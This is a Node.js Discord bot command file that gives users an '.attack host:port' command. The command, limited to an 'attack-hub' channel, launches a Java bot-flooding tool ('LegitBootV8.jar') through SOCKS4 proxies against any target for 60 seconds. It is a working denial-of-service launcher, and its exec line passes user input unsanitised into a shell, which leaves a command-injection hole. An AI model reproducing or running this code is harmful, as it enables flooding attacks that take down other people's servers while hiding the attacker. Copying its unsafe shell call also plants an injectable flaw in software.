const Discord = require("discord.js");
const { MessageEmbed } = require("discord.js");

exports.run = async (client, message, args) => {

  if(message.channel.name == "〔💣〕attack-hub"){

const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
    const proxy = args.join(" ").slice(2)

if(!port)
return message.channel.send("〔💥〕Usage: .attack <host>:<port>")

if(!host)
return message.channel.send("〔💥〕Usage: .attack <host>:<port>")

var exec = require('child_process').exec
exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar ${host}:${port} 2 10 47 120 socks_proxies.txt socks4`, (error, stdout, stderr) => {
});

    const embed = new MessageEmbed()
      .setColor('RANDOM')
      .setTitle('Custompayload > REQUEST ACCEPTED')
      .setDescription('Starting attack...')
      .addField('Hostname (IP)', host)  
      .addField('Port (...)', port)     
      .addField('Time (60)', '60')
      .addField('Method (...)', 'FastJoin (Join Bots)')
      .setImage('https://images-ext-2.discordapp.net/external/rvSo0iq4aJ1rmbbu9D6RuyjlEbCY2BNETMzsIva9Cjo/%3Fwidth%3D360%26height%3D225/https/images-ext-2.discordapp.net/external/fpO1qMI3kRJeoa1sWT_yup1JKsdpmrGlPM_OA5BjkPY/https/i.imgur.com/Fn9HQ17.gif?width=324&height=202')
      .setFooter('> Bot attacks')
        message.channel.send(embed)

    
  } else {
        message.channel.send(":x: ")

  }


  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'BigPayload',
  usage: 'attack'
}
